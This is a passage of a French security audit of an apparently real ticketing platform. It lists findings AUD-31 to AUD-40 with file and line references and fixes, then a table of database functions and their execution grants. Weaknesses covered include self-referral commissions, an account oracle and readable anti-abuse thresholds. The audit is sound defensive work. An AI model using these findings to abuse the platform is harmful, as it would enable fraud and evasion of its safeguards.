- **Constat** : seul le parrainage de soi-même par le même compte est refusé (`app/api/auth/register/route.ts:31`) ; un second numéro rapporte une commission sur ses propres achats.
- **Correctif recommandé** : refuser le parrainage entre comptes qui partagent un numéro payeur ou un appareil ; plafond de commission par filleul.
- **Effort** : 3 h.

### AUD-31 — Limite de billets gratuits contournée par transfert

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : seuls les billets encore détenus sont comptés (`20261105000007_lot7_confirmation.sql:239-241`).
- **Correctif recommandé** : compter les billets gratuits émis pour le compte (y compris transférés), pas seulement détenus.
- **Effort** : 1 h.

### AUD-32 — Invitations : jusqu'à 1 200 SMS par jour et par événement

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : hors quota par compte et hors plafond global (`20261110000008_lot9ter_invites.sql:374-381`).
- **Correctif recommandé** : quota d'invitations par compte et par jour ; part du plafond global réservée aux invitations.
- **Effort** : 2 h.

### AUD-33 — `audit_logs` garde numéros et noms en clair, jamais purgés à l'anonymisation

- **Gravité** : FAIBLE · **Précision** : `app/api/admin/users/route.ts:207-214`, `app/api/controller/setup/route.ts:197` ; aucune mise à jour ni suppression de `audit_logs`
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : ; IP brute de `x-forwarded-for` (`lib/admin/admin-auth.ts:197`) ; un journal écrit un numéro complet (`app/api/partner/team/invite/route.ts:129`).
- **Correctif recommandé** : pseudonymiser `audit_logs` à l'anonymisation (numéros et noms remplacés), IP issue de `getClientIp`, numéro masqué dans le journal d'invitation.
- **Effort** : 2 h.

### AUD-34 — Adresse email en attente non réservée

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : quand un compte valide une adresse, les autres comptes qui l'attendaient la perdent (`20261109000010_lot9bis_email.sql:1038-1040`) ; une victime qui clique un lien qu'elle n'a pas demandé rattache son adresse au compte d'un tiers.
- **Correctif recommandé** : ne retirer l'adresse en attente d'un autre compte qu'après sa confirmation par son propriétaire, et prévenir celui-ci.
- **Effort** : 2 h.

### AUD-35 — Oracle « numéro de contrôleur ou d'admin activé »

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : 409 `ALREADY_ACTIVATED` avant le quota et le contrôle de propriété, avec n'importe quel événement (`app/api/partner/team/invite/route.ts:170-183`).
- **Correctif recommandé** : contrôle de propriété et quota avant toute réponse qui dépend du compte invité ; réponse identique.
- **Effort** : 1 h.

### AUD-36 — `POST /api/partner/upload`

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : images publiques sans quota ni contrôle du statut de la fiche partenaire (une fiche REJETE garde un compte ACTIF) ; corps lu en entier avant le contrôle de taille (`app/api/partner/upload/route.ts:28-41`).
- **Correctif recommandé** : quota par compte, fiche partenaire VALIDE exigée, taille contrôlée par `content-length` avant lecture.
- **Effort** : 1 h.

### AUD-37 — Lectures d'administration sans permission

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : tout ADMIN lit tous les réglages, les permissions d'un autre admin et les réglages financiers (`GET /api/admin/pricing`, `GET /api/admin/permissions?adminId=`, `GET /api/admin/finance-settings` appellent `verifyAdminAuth(req)` sans permission).
- **Correctif recommandé** : permission dédiée (`settings.read`) sur ces trois lectures ; permissions d'un autre admin réservées au SUPERADMIN.
- **Effort** : 1 h.

### AUD-38 — Routes coûteuses sans quota

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : catalogue public non mis en cache, PDF de clôture, export comptable (`app/api/events/route.ts:61-65`, `app/api/partner/reports/closing/pdf/route.ts:26-27`).
- **Correctif recommandé** : cache du catalogue public (revalidation courte), quota par compte sur les PDF et exports.
- **Effort** : 3 h.

### AUD-39 — `PUSH_ENDPOINT_ALLOWED_ORIGINS`

- **Gravité** : FAIBLE
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : admet `http://127.0.0.1` et `http://localhost` quelle que soit l'installation (`lib/push/endpoints.ts:62-64`) : point d'appel local si la variable est mal réglée en production.
- **Correctif recommandé** : refuser http et les hôtes locaux quand `NODE_ENV=production` ; test de démarrage.
- **Effort** : 1 h.

### AUD-40 — Réglages de la plateforme lisibles par un visiteur

- **Gravité** : FAIBLE · **Précision** : A01, exposition
- **Statut** : PROUVÉ par lecture (relevé par une lecture parallèle, lignes relues)
- **Constat** : la politique `platform_settings_read` vaut `USING (TRUE)` (`supabase/migrations/0007_superadmin_complete.sql:109-110`) ; un visiteur lit les 42 réglages (tableau 2), sans secret mais avec les seuils anti-abus (plafonds SMS optionnels, périmètre de la saisie manuelle, alertes de refus) qu'un attaquant utilise pour rester sous les seuils.
- **Correctif recommandé** : vue publique limitée aux réglages d'affichage ; politique de `platform_settings` réservée aux admins.
- **Effort** : 1 h.

---

## 2. Tableau 1 — fonctions de la base exécutables par `anon` et `authenticated`

INVENTAIRE — 289 fonction(s) du projet dans public (+ 188 fonction(s) d'extensions)

Groupes : a = aide RLS (liste blanche), b = RPC métier (service_role seul), c = fonction de trigger.

| Groupe | Fonction | SECURITY DEFINER | Volatilité | search_path | EXECUTE anon | EXECUTE authenticated | EXECUTE service_role |
|---|---|---|---|---|---|---|---|
| a | auth_user_role() | oui | STABLE | search_path=public | oui | oui | oui |
| a | has_role(p_role user_role) | oui | STABLE | search_path=public | oui | oui | oui |
| a | is_admin() | oui | STABLE | search_path=public | oui | oui | oui |
| a | is_controller() | oui | STABLE | search_path=public | oui | oui | oui |
| a | is_partner_owner(p_partner_id uuid) | oui | STABLE | search_path=public | oui | oui | oui |
| a | is_superadmin() | oui | STABLE | search_path=public | oui | oui | oui |
| a | ticket_category_private_read(p_event uuid) | oui | STABLE | search_path=public | oui | oui | oui |
| b | account_avatar_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | account_identity_taken(p_user_id uuid, p_email text, p_phone text) | oui | STABLE | search_path=public | non | non | oui |
| b | account_password_finalize(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | account_phone_finalize(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | account_profile_finalize(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | activate_partner_trial(p_partner_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | admin_can(p_actor uuid, p_permission text) | oui | STABLE | search_path=public | non | non | oui |
| b | admin_events_list(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | admin_notification_detail(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | admin_notifications_list(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | admin_notifications_stats(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | admin_permissions_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | admin_user_status_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | atomic_partner_remove_controller(p_partner_id uuid, p_controller_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | calculate_referral_commissions(p_payment_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashout_admin_decide(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashout_admin_not_sent(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashout_fee_apply(p_cashout_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashout_finalize(p_cashout_id uuid, p_outcome text, p_detail text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashouts_flag_delayed() | oui | VOLATILE | search_path=public | non | non | oui |
| b | cashouts_to_resume() | oui | STABLE | search_path=public | non | non | oui |
| b | checkout_create_payment(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | client_payments_list(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | controller_account_states(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | controller_assignments_sync(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | controller_gate_select(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | controller_invitation_create(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | controller_invitation_respond(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | controller_invitations_mine(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | controller_scan_stats(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | counter_sale(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | counter_sale_quote(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | create_hall_reservation_atomic(p_hall_id uuid, p_client_id uuid, p_start_date date, p_end_date date, p_start_time time without time zone, p_end_time time without time zone, p_notes text, p_moratorium_date date) | oui | VOLATILE | search_path=public, extensions | non | non | oui |
| b | create_table_reservation_atomic(p_table_id uuid, p_client_id uuid, p_reservation_date date, p_reservation_time time without time zone, p_guest_count integer, p_notes text) | oui | VOLATILE | search_path=public, extensions | non | non | oui |
| b | email_verification_check(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | email_verification_finalize(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | email_verification_issue(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | email_verification_log(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | essai_check_reel(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ev_request_simulated() | oui | STABLE | search_path=public | non | non | oui |
| b | event_actions(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | event_actor_profile(p_event uuid, p_actor uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | event_actor_profile_perm(p_event uuid, p_actor uuid, p_permission text) | oui | STABLE | search_path=public | non | non | oui |
| b | event_cancel(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_cancellation_impact(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | event_cancellation_progress(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | event_cash_refund_mark(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_cash_refunds(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | event_controller_gate_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_controller_set_cash(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_create(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_edit_locks(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | event_edit_refusal(p_code text, p_message text, p_field text, p_extra jsonb) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | event_end_at(p_event_id uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | event_end_from(p_start_date date, p_end_date date, p_end_time time without time zone) | oui | STABLE | search_path=public | non | non | oui |
| b | event_end_from_v2(p_start_date date, p_start_time time without time zone, p_end_date date, p_end_time time without time zone) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | event_has_sales(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | event_poster_path_ok(p_url text, p_partner uuid) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | event_start_at(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | event_status_apply(p_event uuid, p_from event_status, p_to event_status, p_actor uuid, p_role text, p_reason text, p_channel text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_status_label(p_status text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | event_transition(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_update(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | event_zones_get(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | event_zones_save(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | events_finish_overdue(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | events_popular(p_limit integer) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_account_lock(p_owner uuid, p_kind text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_alert_superadmins(p_action text, p_title text, p_content text, p_object_type text, p_object_id uuid, p_metadata jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_event_end(p_event_id uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_frozen_amount(p_owner uuid, p_kind text, p_at timestamp with time zone) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_ledger_credit(p_owner uuid, p_kind text, p_partner uuid, p_type text, p_amount numeric, p_available_at timestamp with time zone, p_refs jsonb, p_source_key text, p_description text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_ledger_debit(p_owner uuid, p_kind text, p_partner uuid, p_type text, p_amount numeric, p_available_at timestamp with time zone, p_refs jsonb, p_source_key text, p_description text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_offline() | non | IMMUTABLE | search_path=public | non | non | oui |
| b | fin_payout_available_at(p_payment_id uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_referral_allocate(p_user uuid, p_withdrawal_id uuid, p_amount numeric) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_referral_on_refund(p_payment_id uuid, p_refund_id uuid, p_prev_refunded numeric, p_new_refunded numeric) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_referral_unallocate(p_withdrawal_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_refund_apply(p_refund_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | fin_round_2(x numeric) | non | IMMUTABLE | search_path=public | non | non | oui |
| b | fin_round_down(x numeric) | non | IMMUTABLE | search_path=public | non | non | oui |
| b | fin_round_up(x numeric) | non | IMMUTABLE | search_path=public | non | non | oui |
| b | fin_setting(p_key text) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_setting_bool(p_key text) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_setting_num(p_key text) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_setting_text(p_key text) | oui | STABLE | search_path=public | non | non | oui |
| b | fin_setting_valid(p_key text, v jsonb) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | fin_withdrawal_check(p_user uuid, p_kind text, p_gross numeric, p_at timestamp with time zone) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_account_balance(p_owner uuid, p_kind text) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_compute(p_target text, p_lines jsonb, p_operator text) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_partner_summary(p_partner_id uuid, p_event_id uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_platform_revenue(p_from timestamp with time zone, p_to timestamp with time zone) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_quote(p_event_id uuid, p_items jsonb, p_operator text) | oui | STABLE | search_path=public | non | non | oui |
| b | finance_setting_set(p_key text, p_value jsonb, p_actor uuid, p_reason text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | free_tickets_claim(p_user_id uuid, p_event_id uuid, p_items jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | generate_referral_code(p_user_id uuid, p_phone text) | non | VOLATILE | search_path=public, extensions | non | non | oui |
| b | has_admin_permission(p_user_id uuid, p_permission text) | oui | VOLATILE | search_path=public, extensions | non | non | oui |
| b | low_stock_threshold() | oui | STABLE | search_path=public | non | non | oui |
| b | notif_account_blocked(p_user uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_admin_recipients(p_permission text) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_enqueue(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notif_enqueue_admins(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notif_event_data(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_failed_alert(p_id uuid, p_type text, p_channel text, p_reason text, p_attempts integer, p_now timestamp with time zone) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notif_in_quiet_hours(p_at timestamp with time zone, p_start integer, p_end integer) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | notif_preference_enabled(p_user uuid, p_topic text, p_channel text) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_pros_event_data(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_setting_int(p_key text) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_sms_optional_used(p_day date) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_ticket_lines(p_ticket_ids uuid[]) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_try_timestamptz(p_value text) | oui | STABLE | search_path=public | non | non | oui |
| b | notif_upsert_aggregated_sms(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notif_verified_email(p_user uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | notification_admin_alert(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_controller_activated(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_daily_checks(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_demo_recipients(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | notification_outbox_claim(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_outbox_mark(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_preference_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_preferences_get(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | notification_reminders_schedule(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_retry(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_sync_log(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notification_test_push_enqueue(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notifications_mark_read(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | notifications_page(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | otp_check(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | participants_export(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | partner_controller_known(p_partner uuid, p_user uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | partner_dossier_resubmit(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | partner_events_overview(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | partner_profile_update(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | partner_register_finalize(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | partner_status_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | payment_confirm(p_payment_id uuid, p_source text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | payment_duplicate_of(p_payment_id uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | payment_release(p_payment_id uuid, p_status text, p_reason text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | payment_webhook_record(p_dedupe_key text, p_raw_body text, p_headers jsonb, p_token_present boolean, p_order_id text, p_transaction_id text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | pilotage_access(p_event uuid, p_actor uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_cash(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_category_stats(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_closing(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_compute_cash(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_compute_entries(p_event uuid, p_with_names boolean) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_compute_overview(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_display_name(p_first text, p_last text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | pilotage_entries(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_overview(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_refusal(p_code text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | pilotage_sales(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_scan_result_label(p_result text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | pilotage_team(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | pilotage_ticket_status_label(p_status text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | public_category_stock_sync(p_category_id uuid, p_threshold integer) | oui | VOLATILE | search_path=public | non | non | oui |
| b | public_event_state_sync(p_event_id uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | quota_release(p_rules jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | quota_reserve(p_rules jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | referral_commissions_realign(p_event uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | referral_commissions_release() | oui | VOLATILE | search_path=public | non | non | oui |
| b | refund_request(p_payment_id uuid, p_reason text, p_kind text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | revoke_user_sessions(p_user_id uuid) | oui | VOLATILE | search_path="" | non | non | oui |
| b | scan_alert_refusal(p_result text, p_zone_result text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | scan_event_problem(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_gate_context(p_scanner uuid, p_event uuid, p_claimed uuid, p_claimed_given boolean) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_incident_log(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | scan_is_refusal(p_accepted boolean, p_result text, p_zone_result text, p_consumed_at timestamp with time zone) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | scan_log(p_ticket uuid, p_event uuid, p_scanner uuid, p_result text, p_accepted boolean, p_method text, p_identity boolean, p_hash text, p_amount numeric, p_secret_version integer, p_client_key text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | scan_log_at(p_ticket uuid, p_event uuid, p_scanner uuid, p_result text, p_zone_result text, p_accepted boolean, p_method text, p_identity boolean, p_hash text, p_amount numeric, p_secret_version integer, p_client_key text, p_gate uuid, p_zone uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | scan_refusal_alert_settings(OUT threshold integer, OUT minutes integer) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_scanner_authorized(p_scanner uuid, p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_states(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_window(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | scan_zone_verdict(p_event uuid, p_zone uuid, p_kind text, p_category uuid, p_status text) | oui | STABLE | search_path=public | non | non | oui |
| b | shift_can_handle_cash(p_user uuid, p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | shift_close(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | shift_open(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | stock_reservations_expire() | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_card_states(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_category_create(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_category_delete(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_category_guard(p_event uuid, p_actor uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_category_has_sales(p_category uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_category_normalize(p_cat jsonb, p_event_end timestamp with time zone, p_prefix text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_category_update(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_counter_channel_problems(p_event uuid, p_items jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_guest_list_search(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_invitation_cancel(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_invitation_create(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_invitation_guest_name_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_invitations_list(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_manual_lookup(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_offline_grant(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_offline_info(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_offline_window(p_event uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_origin(p_channel text, p_price numeric, p_offline_paid boolean) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | ticket_origin_label(p_origin text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | ticket_postponement_refund_open(p_ticket uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_refund_request(p_ticket_id uuid, p_actor uuid, p_reason text) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_sale_problems(p_event_id uuid, p_items jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_scan(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_secret_rotate(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfer_accept(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfer_cancel(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfer_claim(p_transfer_id uuid, p_recipient uuid) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfer_decline(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfer_identity(p_target text, p_user uuid) | oui | STABLE | search_path=public | non | non | oui |
| b | ticket_transfer_initiate(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfers_expire(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfers_expire_due(p_ticket uuid, p_skip_locked boolean) | oui | VOLATILE | search_path=public | non | non | oui |
| b | ticket_transfers_incoming(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | tickets_postponement_offers(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | try_uuid(p_value text) | oui | IMMUTABLE | search_path=public | non | non | oui |
| b | user_roles_set(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| b | withdrawal_quote(p jsonb) | oui | STABLE | search_path=public | non | non | oui |
| b | withdrawal_request(p jsonb) | oui | VOLATILE | search_path=public | non | non | oui |
| c | admin_signal_event_submitted() | oui | VOLATILE | search_path=public | non | non | oui |
| c | admin_signal_partner_registered() | oui | VOLATILE | search_path=public | non | non | oui |
| c | audit_log_changes() | oui | VOLATILE | search_path=public, auth, extensions | non | non | oui |
| c | cashouts_simulated_set() | oui | VOLATILE | search_path=public | non | non | oui |
| c | cashouts_simulation_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | check_hall_availability() | non | VOLATILE | — | non | non | oui |
| c | check_no_circular_referral() | non | VOLATILE | search_path=public, extensions | non | non | oui |
| c | controller_removal_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | event_status_history_append_only() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_delete_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_force_draft() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_invitation_expiry_sync() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_log_creation() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_public_summary_sync() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_referral_realign() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_status_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | events_truncate_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | fin_ledger_compensate() | oui | VOLATILE | search_path=public | non | non | oui |
| c | fin_payment_sale_credit() | oui | VOLATILE | search_path=public | non | non | oui |
| c | handle_new_user() | oui | VOLATILE | search_path=public | non | non | oui |
| c | handle_updated_at() | non | VOLATILE | search_path=public, extensions | non | non | oui |
| c | low_stock_threshold_resync() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_cancel_on_holder_change() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_cancel_on_reschedule() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_cancel_on_status() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_cashouts_notify() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_controller_shifts_report_ready() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_event_controllers_notify() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_event_status_admin_alert() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_event_status_changed() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_events_admin_change_alert() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_hall_reservations_notify() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_on_password_changed() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_partners_notify() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_partners_subscription() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_payments_other_success() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_sponsored_promotions_notify() | oui | VOLATILE | search_path=public | non | non | oui |
